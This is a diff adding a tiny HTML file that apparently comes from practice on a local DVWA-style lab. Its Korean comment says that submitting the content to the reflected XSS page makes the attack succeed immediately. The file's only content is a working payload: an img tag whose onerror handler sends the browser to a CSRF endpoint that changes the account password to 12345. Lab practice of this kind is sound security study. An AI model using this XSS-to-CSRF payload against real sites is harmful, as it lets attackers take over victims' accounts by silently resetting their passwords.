@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <!--아래 내용을 Reflected Cross Site Scripting (XSS)페이지에 전송하면 바로 공격 성공함-->
+<img src=# onerror="location.href='http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=12345&password_conf=12345&Change=Change';">
+</body>
+</html>
